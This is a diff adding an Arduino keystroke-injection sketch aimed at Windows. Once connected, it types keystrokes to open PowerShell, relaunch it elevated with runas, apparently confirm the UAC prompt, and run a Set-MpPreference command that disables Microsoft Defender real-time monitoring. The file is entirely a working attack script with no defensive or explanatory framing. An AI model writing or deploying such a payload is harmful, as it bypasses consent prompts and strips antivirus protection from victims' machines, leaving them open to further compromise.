@@ -1,0 +1,60 @@
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  typeKey(KEY_LEFT_GUI);
+
+  delay(2000);
+
+  Keyboard.print("Windows powershell");
+
+  delay(2000);
+
+  typeKey(KEY_RETURN);
+
+  delay(3000);
+
+  Keyboard.print("start-process powershell -verb runas");
+
+  delay(2000);
+
+  typeKey(KEY_RETURN);
+
+  delay(2000);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_ARROW);
+  Keyboard.releaseAll();
+
+  delay(2000);
+
+  typeKey(KEY_RETURN);
+
+  delay(2000);
+
+  Keyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
+
+  delay(2000);
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
